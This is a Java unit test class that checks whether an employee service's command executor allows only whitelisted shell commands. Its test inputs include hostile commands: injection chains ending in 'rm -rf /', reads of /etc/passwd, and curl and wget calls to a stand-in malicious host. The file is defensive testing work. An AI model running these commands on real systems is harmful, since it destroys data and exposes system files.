package com.example.service;

import static org.assertj.core.api.Assertions.assertThat;

import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.springframework.boot.test.context.SpringBootTest;

@SpringBootTest
public class EmployeeServiceSecurityTest {

  private EmployeeService employeeService;

  @BeforeEach
  public void setup() {
    employeeService = new EmployeeService();
  }

  @Test
  public void testExecuteCommand_AllowedCommand_ls() {
    String result = employeeService.executeCommand("ls");

    assertThat(result).doesNotContain("Error: Invalid or unauthorized command");
  }

  @Test
  public void testExecuteCommand_AllowedCommand_pwd() {
    String result = employeeService.executeCommand("pwd");

    assertThat(result).doesNotContain("Error: Invalid or unauthorized command");
  }

  @Test
  public void testExecuteCommand_AllowedCommand_date() {
    String result = employeeService.executeCommand("date");

    assertThat(result).doesNotContain("Error: Invalid or unauthorized command");
  }

  @Test
  public void testExecuteCommand_AllowedCommand_whoami() {
    String result = employeeService.executeCommand("whoami");

    assertThat(result).doesNotContain("Error: Invalid or unauthorized command");
  }

  @Test
  public void testExecuteCommand_AllowedCommand_echo() {
    String result = employeeService.executeCommand("echo test");

    assertThat(result).doesNotContain("Error: Invalid or unauthorized command");
  }

  @Test
  public void testExecuteCommand_BlocksCommandInjection_Semicolon() {
    String maliciousCommand = "ls; rm -rf /";
    String result = employeeService.executeCommand(maliciousCommand);

    assertThat(result).isEqualTo("Error: Invalid or unauthorized command");
  }

  @Test
  public void testExecuteCommand_BlocksCommandInjection_Pipe() {
    String maliciousCommand = "ls | cat /etc/passwd";
    String result = employeeService.executeCommand(maliciousCommand);

    assertThat(result).isEqualTo("Error: Invalid or unauthorized command");
  }

  @Test
  public void testExecuteCommand_BlocksCommandInjection_Ampersand() {
    String maliciousCommand = "ls & cat /etc/passwd";
    String result = employeeService.executeCommand(maliciousCommand);

    assertThat(result).isEqualTo("Error: Invalid or unauthorized command");
  }

  @Test
  public void testExecuteCommand_BlocksUnauthorizedCommand_rm() {
    String maliciousCommand = "rm -rf /tmp/test";
    String result = employeeService.executeCommand(maliciousCommand);

    assertThat(result).isEqualTo("Error: Invalid or unauthorized command");
  }

  @Test
  public void testExecuteCommand_BlocksUnauthorizedCommand_cat() {
    String maliciousCommand = "cat /etc/passwd";
    String result = employeeService.executeCommand(maliciousCommand);

    assertThat(result).isEqualTo("Error: Invalid or unauthorized command");
  }

  @Test
  public void testExecuteCommand_BlocksUnauthorizedCommand_curl() {
    String maliciousCommand = "curl http://malicious.com";
    String result = employeeService.executeCommand(maliciousCommand);

    assertThat(result).isEqualTo("Error: Invalid or unauthorized command");
  }

  @Test
  public void testExecuteCommand_BlocksUnauthorizedCommand_wget() {
    String maliciousCommand = "wget http://malicious.com/malware.sh";
    String result = employeeService.executeCommand(maliciousCommand);

    assertThat(result).isEqualTo("Error: Invalid or unauthorized command");
  }

  @Test
  public void testExecuteCommand_BlocksUnauthorizedCommand_bash() {
    String maliciousCommand = "bash -c 'malicious code'";
    String result = employeeService.executeCommand(maliciousCommand);

    assertThat(result).isEqualTo("Error: Invalid or unauthorized command");
  }

  @Test
  public void testExecuteCommand_BlocksNullCommand() {
    String result = employeeService.executeCommand(null);

    assertThat(result).isEqualTo("Error: Invalid or unauthorized command");
  }

  @Test
  public void testExecuteCommand_BlocksEmptyCommand() {
    String result = employeeService.executeCommand("");

    assertThat(result).isEqualTo("Error: Invalid or unauthorized command");
  }

  @Test
  public void testExecuteCommand_BlocksWhitespaceOnlyCommand() {
    String result = employeeService.executeCommand("   ");

    assertThat(result).isEqualTo("Error: Invalid or unauthorized command");
  }
}
